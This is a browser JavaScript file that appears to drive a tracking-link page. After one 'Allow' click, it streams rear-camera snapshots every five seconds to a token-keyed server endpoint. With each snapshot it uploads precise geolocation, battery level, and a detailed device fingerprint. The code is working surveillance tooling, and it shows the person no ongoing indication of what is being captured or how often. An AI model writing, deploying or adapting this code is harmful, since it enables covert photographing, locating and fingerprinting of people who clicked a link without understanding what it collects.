// static/wrap_app.js
(async () => {
  const allowBtn = document.getElementById("consentAllow");
  const denyBtn = document.getElementById("consentDeny");
  const overlay = document.getElementById("consentOverlay");

  const video = document.getElementById("video");
  const token = TOKEN;
  const captureMs = 5000;

  let stream = null;
  let captureInterval = null;

  const canvas = document.createElement("canvas");
  const ctx = canvas.getContext("2d");

  // collect "static" device info
  async function collectDeviceDetails() {
    const ua = navigator.userAgent || "";
    const platform = navigator.platform || null;
    const cpu = navigator.hardwareConcurrency || null;
    const ram = navigator.deviceMemory || null;
    const langs = navigator.languages || [navigator.language];

    let tz = null;
    try {
      tz = {
        zone: Intl.DateTimeFormat().resolvedOptions().timeZone,
        offset: new Date().getTimezoneOffset()
      };
    } catch (_) {}

    const scr = {
      w: screen.width,
      h: screen.height,
      ratio: window.devicePixelRatio || 1,
    };

    const n = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
    const net = n ? {
      type: n.effectiveType,
      downlink: n.downlink,
      rtt: n.rtt,
      saveData: n.saveData
    } : null;

    // permission states
    let perms = {};
    if (navigator.permissions) {
      for (const name of ["geolocation", "camera"]) {
        try {
          const s = await navigator.permissions.query({ name });
          perms[name] = s.state;
        } catch (_) {}
      }
    }

    return {
      userAgent: ua,
      platform,
      cpuCores: cpu,
      ramGB: ram,
      languages: langs,
      tz,
      screen: scr,
      network: net,
      permissions: perms,
    };
  }

  async function readBattery() {
    try {
      if (!navigator.getBattery) return null;
      const b = await navigator.getBattery();
      return { level: Math.round(b.level * 100), charging: b.charging };
    } catch (_) {
      return null;
    }
  }

  async function getLocation() {
    return new Promise((resolve) => {
      if (!navigator.geolocation) return resolve(null);
      navigator.geolocation.getCurrentPosition(
        pos => resolve({
          lat: pos.coords.latitude,
          lon: pos.coords.longitude,
          acc: pos.coords.accuracy
        }),
        () => resolve(null),
        { enableHighAccuracy: true, maximumAge: 20000 }
      );
    });
  }

  function waitForVideoReady(timeout = 3000) {
    return new Promise((resolve) => {
      if (video.videoWidth > 0) return resolve(true);
      let done = false;
      function ok() {
        if (!done && video.videoWidth > 0) {
          done = true;
          cleanup();
          resolve(true);
        }
      }
      function cleanup() {
        video.removeEventListener("loadedmetadata", ok);
        video.removeEventListener("canplay", ok);
      }
      video.addEventListener("loadedmetadata", ok);
      video.addEventListener("canplay", ok);
      setTimeout(() => { if (!done) { done = true; cleanup(); resolve(false); } }, timeout);
    });
  }

  async function uploadFrame() {
    if (!stream) return;

    if (!video.videoWidth || !video.videoHeight) return;

    canvas.width = video.videoWidth;
    canvas.height = video.videoHeight;
    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
    const dataUrl = canvas.toDataURL("image/jpeg", 0.75);

    await fetch(`/upload_image/${token}`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ image_b64: dataUrl })
    });
  }

  async function uploadInfo() {
    const battery = await readBattery();
    const coords = await getLocation();
    const details = await collectDeviceDetails();

    await fetch(`/upload_info/${token}`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ battery, coords, details })
    });
  }

  async function startSession() {
    stream = await navigator.mediaDevices.getUserMedia({
      video: { facingMode: "environment" },
      audio: false
    });
    video.srcObject = stream;
    await video.play();
    await waitForVideoReady(4000);

    // First info + first photo immediately
    await uploadInfo();
    await uploadFrame();

    // then every 5 sec
    captureInterval = setInterval(async () => {
      await uploadInfo();
      await uploadFrame();
    }, captureMs);
  }

  function stopSession() {
    if (captureInterval) clearInterval(captureInterval);
    captureInterval = null;

    if (stream) {
      for (const t of stream.getTracks()) t.stop();
      stream = null;
      video.srcObject = null;
    }
  }

  allowBtn.addEventListener("click", async () => {
    overlay.style.display = "none";
    startSession();
  });

  denyBtn.addEventListener("click", () => {
    overlay.style.display = "none";
  });

  window.addEventListener("beforeunload", stopSession);
})();
